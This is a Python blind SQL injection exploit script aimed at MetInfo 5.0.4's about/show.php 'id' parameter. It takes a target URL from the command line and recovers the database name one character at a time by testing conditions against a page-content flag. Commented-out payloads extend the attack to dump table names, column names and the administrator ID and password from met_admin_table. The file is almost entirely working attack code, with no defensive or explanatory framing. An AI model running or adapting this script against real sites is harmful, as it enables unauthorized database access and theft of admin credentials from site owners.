#coding:utf-8

import requests
import time
import string
import sys

'''
/about/show.php?lang=cn&id=22
 and 1=2--+
 and length(database())=1--+
 and ascii(substr(database(),1,1))=1--+
'''

url = sys.argv[1] + "MetInfo5.0.4/about/show.php?lang=cn&id=22"
flag = "0000-888888"

print("[+] URL: {}".format(url))

def getContLen(url):
    for i in range(1,1000):
        payload = " and length(database())={}".format(i)
        # payload = " and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={}".format(i)
        # payload = " and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65))={}".format(i)
        # payload = " and length((select concat(admin_id,0x3a,admin_pass) from met_admin_table limit 0,1))={}".format(i)
        fullUrl = url + payload
        
        print("[+] PAYLOAD:" + payload + '\r' ,end = '')
    
        
        # time.sleep(0.5)

        if flag in requests.get(fullUrl).text:
            print("\n" ,end = "")

            break

    return i


def getCont(url):
    cont = ""
    for i in range(1,contLen + 1):
        for j in string.printable.strip():
            payload = " and ascii(substr(database(),{},1))={}".format(i,ord(j))
            # payload = " and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))={}".format(i,ord(j))
            # payload = " and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65),{},1))={}".format(i,ord(j))
            # payload = " and ascii(substr((select concat(admin_id,0x3a,admin_pass) from met_admin_table limit 0,1),{},1))={}".format(i,ord(j))

            fullUrl = url + payload

            print("[+] PAYLOAD: " + payload + '\r' ,end = '')

            # time.sleep(0.1)

            if flag in requests.get(fullUrl).text:
                cont += j
                print("\n\n\033[32m[+] RESULT: {}\033[0m".format(cont) ,end = "\n\n")

                break

    return cont

contLen = getContLen(url)
print("\n\033[32m[*] RESULT: The content length is {}\n\033[0m".format(contLen))

getCont(url)